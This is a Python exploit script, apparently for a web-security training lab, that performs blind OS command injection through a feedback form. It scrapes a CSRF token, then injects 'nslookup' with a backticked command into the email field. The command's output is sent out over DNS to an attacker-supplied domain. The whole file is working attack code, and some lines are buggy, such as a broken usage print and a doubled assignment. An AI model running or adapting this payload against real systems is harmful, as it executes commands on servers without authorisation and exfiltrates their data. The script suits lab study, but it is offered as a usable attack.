import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import socket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url+feedback_path, verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def check_dns_lookup(s, url, dns, command):
    collabrator_url = 'http://'+dns+'/burpcollaborator/server/dns'
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test & nslookup `'+command+'`.'+dns+' #'
    csrf_token = get_csrf_token(s, url)
    data = data = {'csrf' : csrf_token, 'name' : 'test', 'email' : command_injection,'subject': 'test','message':'test'}
    res1 = s.post(url+submit_feedback_path,data=data, verify=False, proxies=proxies)
    if(res1.status_code == 200):
        print("(+) DNS lookup successful")
    res2 = s.get(collabrator_url,verify=False, proxies=proxies)
    if(res2.status_code == 200):
        print("(+) DNS request successful")
        print(res2.text)
    else:
        None

    collaborator_client_domain = socket.getfqdn()
    print("Burp Collaborator Client Domain:", collaborator_client_domain)

    

def main():
    if len(sys.argv) != 4:
        print("(+) Usage : %s <url> <dns server> <command>") % sys.argv[0]
        print("(+) Example: %s www.example.com" "xyz.net" "whoami"% sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    dns = sys.argv[2]
    command = sys.argv[3]
    print("(+) testing Blind OS command injection with out-of-band interaction")
    s = requests.session()
    check_dns_lookup(s, url, dns, command)

if __name__ == '__main__':
    main()